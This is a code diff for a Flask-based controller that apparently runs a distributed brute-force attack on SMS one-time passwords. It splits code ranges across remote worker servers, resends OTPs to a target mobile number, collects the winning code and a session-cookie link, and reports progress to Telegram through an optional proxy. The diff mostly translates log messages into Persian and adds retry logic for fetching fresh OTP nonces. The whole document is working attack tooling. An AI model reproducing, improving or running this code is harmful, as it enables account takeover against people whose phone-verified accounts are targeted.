@@ -60,17 +60,6 @@ def send_to_telegram(message):
         print(f"Failed to send Telegram message: {str(e)}")
         return False
 
-# Example usage of Telegram sending
-def log_to_telegram_example():
-    message = (
-        "🔔 <b>Server Update</b>\n"
-        f"📅 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
-        "ℹ️ Operation started on central server\n"
-        f"🔧 Servers: {len(REMOTE_SERVERS)} active\n"
-        "📡 Status: Initializing..."
-    )
-    send_to_telegram(message)
-
 def get_proxy_from_central():
     return "socks5://new_user:new_pass@new_host:new_port"
 
@@ -150,51 +139,71 @@ def resend_otp(host, mobile, nonce):
 
 def auto_stop_and_restart():
     global current_operation, found_success
-    time.sleep(20 * 60)  # 20 minutes
+    time.sleep(20 * 60)  # 20 دقیقه صبر
     stop_all_servers()
     
-    message = "⏹️ All servers stopped after 20 minutes"
+    message = "⏹️ تمام سرورها بعد از ۲۰ دقیقه متوقف شدند"
     send_to_telegram(message)
     
-    # Wait until all servers are stopped
+    # منتظر می‌مونیم تا همه سرورها متوقف بشن
     while True:
         status = get_worker_status()
         if all(not data["running"] for data in status.values()):
             break
         time.sleep(1)
     
-    message = "✅ All servers confirmed stopped"
+    message = "✅ توقف تمام سرورها تأیید شد"
     send_to_telegram(message)
     
     if not found_success and current_operation:
-        # Resend SMS
-        if resend_otp(current_operation['host'], current_operation['mobile'], current_operation['nonce']):
-            # Restart workers with same parameters
-            threads = []
-            for i, server in enumerate(REMOTE_SERVERS):
-                start_r, end_r = current_operation['ranges'][i]
-                thread = threading.Thread(
-                    target=send_to_remote,
-                    args=(server, current_operation['host'], current_operation['nonce'],
-                          current_operation['mobile'], current_operation['connections'],
-                          start_r, end_r)
-                )
-                threads.append(thread)
-                thread.start()
-            
-            for thread in threads:
-                thread.join()
-            
-            message = f"🔄 Operation restarted with ranges {current_operation['ranges']}"
+        # ۲ دقیقه صبر قبل از تلاش برای ارسال OTP
+        message = "⏳ انتظار ۲ دقیقه‌ای قبل از تلاش برای ارسال دوباره OTP"
+        send_to_telegram(message)
+        time.sleep(120)  # ۲ دقیقه
+        
+        # تلاش تا ۳ بار برای گرفتن OTP جدید
+        for attempt in range(1, 4):
+            message = f"🔄 تلاش {attempt} از ۳ برای گرفتن OTP جدید"
             send_to_telegram(message)
-            
-            # Schedule next auto-stop
-            threading.Thread(target=auto_stop_and_restart, daemon=True).start()
-        else:
-            message = "❌ Failed to resend OTP, operation not restarted"
-            send_to_telegram(message)
+            new_nonce = fetch_nonce(current_operation['host'], current_operation['mobile'])
+            if new_nonce:
+                # به‌روزرسانی nonce در عملیات فعلی
+                current_operation['nonce'] = new_nonce
+                # ری‌استارت سرورها با پارامترهای قبلی
+                threads = []
+                for i, server in enumerate(REMOTE_SERVERS):
+                    start_r, end_r = current_operation['ranges'][i]
+                    thread = threading.Thread(
+                        target=send_to_remote,
+                        args=(server, current_operation['host'], new_nonce,
+                              current_operation['mobile'], current_operation['connections'],
+                              start_r, end_r)
+                    )
+                    threads.append(thread)
+                    thread.start()
+                
+                for thread in threads:
+                    thread.join()
+                
+                message = f"🔄 عملیات با رنج‌های {current_operation['ranges']} ری‌استارت شد"
+                send_to_telegram(message)
+                
+                # برنامه‌ریزی توقف بعدی
+                threading.Thread(target=auto_stop_and_restart, daemon=True).start()
+                return
+            else:
+                message = f"❌ تلاش {attempt} برای گرفتن OTP جدید شکست خورد"
+                send_to_telegram(message)
+                if attempt < 3:
+                    message = "⏳ انتظار ۱ دقیقه‌ای قبل از تلاش بعدی"
+                    send_to_telegram(message)
+                    time.sleep(60)  # ۱ دقیقه صبر بین تلاش‌ها
+        
+        # اگه بعد از ۳ تلاش موفق نشدیم
+        message = "❌ بعد از ۳ تلاش، OTP جدید دریافت نشد. عملیات متوقف شد."
+        send_to_telegram(message)
     else:
-        message = "ℹ️ No restart needed: Success found or no operation active"
+        message = "ℹ️ نیازی به ری‌استارت نیست: یا موفقیت پیدا شده یا عملیاتی فعال نیست"
         send_to_telegram(message)
 
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
@@ -213,12 +222,12 @@ def send_to_remote(server_url, host, nonce, mobile, connections, start_range, en
             timeout=10
         )
         response.raise_for_status()
-        message = f"📤 Request sent to {server_url} for range {start_range}-{end_range}"
+        message = f"📤 درخواست به {server_url} برای رنج {start_range}-{end_range} ارسال شد"
         progress_log.append(message)
         send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
     except requests.exceptions.RequestException as e:
-        message = f"❌ Failed to send request to {server_url}: {str(e)}"
+        message = f"❌ ارسال درخواست به {server_url} شکست خورد: {str(e)}"
         progress_log.append(message)
         send_to_telegram(message)
         socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -227,12 +236,12 @@ def stop_all_servers():
     for server in REMOTE_SERVERS:
         try:
             requests.post(f"{server}/stop", timeout=5)
-            message = f"⏹️ Stop request sent to {server}"
+            message = f"⏹️ درخواست توقف به {server} ارسال شد"
             progress_log.append(message)
             send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
         except requests.exceptions.RequestException as e:
-            message = f"❌ Failed to stop {server}: {str(e)}"
+            message = f"❌ توقف {server} شکست خورد: {str(e)}"
             progress_log.append(message)
             send_to_telegram(message)
             socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -256,7 +265,7 @@ def get_worker_status():
                 code = status["error"].split("Code ")[1].split(" found")[0]
                 if not any(s["code"] == code for s in success_codes):
                     success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
-                message = f"🎉 Success found on {server}! Code: {code}\nStopping all servers..."
+                message = f"🎉 موفقیت در {server}! کد: {code}\nتوقف تمام سرورها..."
                 progress_log.append(message)
                 send_to_telegram(message)
                 socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -266,9 +275,9 @@ def get_worker_status():
                 "running": False,
                 "current_range": {"start": "-", "end": "-"},
                 "processed": "-",
-                "error": f"Failed to connect: {str(e)}"
+                "error": f"اتصال ناموفق: {str(e)}"
             }
-            message = f"⚠️ Status check failed for {server}: {str(e)}"
+            message = f"⚠️ بررسی وضعیت {server} شکست خورد: {str(e)}"
             send_to_telegram(message)
     return status_data
 
@@ -431,7 +440,7 @@ def index():
                                 running: false,
                                 current_range: { start: '-', end: '-' },
                                 processed: '-',
-                                error: 'No data available'
+                                error: 'داده‌ای در دسترس نیست'
                             };
                             const row = document.createElement('tr');
                             row.innerHTML = `
@@ -483,8 +492,8 @@ def index():
             setInterval(updateTables, 5000);
             updateTables();
 
-            socket.on('connect', () => console.log('Connected to WebSocket'));
-            socket.on('update_progress', function(data) { console.log('Log:', data.log); });
+            socket.on('connect', () => console.log('اتصال به WebSocket برقرار شد'));
+            socket.on('update_progress', function(data) { console.log('لاگ:', data.log); });
 
             document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                 radio.addEventListener('change', () => {
@@ -576,7 +585,7 @@ def start():
     found_success = False
     progress_log = []
     success_codes = []
-    message = f"🚀 Starting operation\nHost: {host}\nMobile: {mobile}\nConnections: {connections}\nScan Type: {scan_type}"
+    message = f"🚀 شروع عملیات\nهاست: {host}\nموبایل: {mobile}\nکانکشن‌ها: {connections}\nنوع اسکن: {scan_type}"
     progress_log.append(message)
     send_to_telegram(message)
     socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -624,7 +633,7 @@ def start():
 def stop():
     global progress_log
     stop_all_servers()
-    message = "🛑 Manual stop requested by user"
+    message = "🛑 توقف دستی توسط کاربر درخواست شد"
     progress_log.append(message)
     send_to_telegram(message)
     return '', 204
@@ -634,7 +643,7 @@ def set_proxy():
     global proxy_setting
     data = request.get_json()
     proxy_setting = data.get('proxy', '')
-    message = f"🔧 Proxy set to: {proxy_setting}"
+    message = f"🔧 پروکسی تنظیم شد: {proxy_setting}"
     progress_log.append(message)
     send_to_telegram(message)
     socketio.emit('update_progress', {'log': progress_log[-1]})
@@ -662,7 +671,7 @@ def fetch_nonce_route():
     nonce = fetch_nonce(host, mobile)
     if nonce:
         return jsonify({'nonce': nonce})
-    return jsonify({'error': 'Failed to fetch nonce'}), 400
+    return jsonify({'error': 'دریافت nonce ناموفق بود'}), 400
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
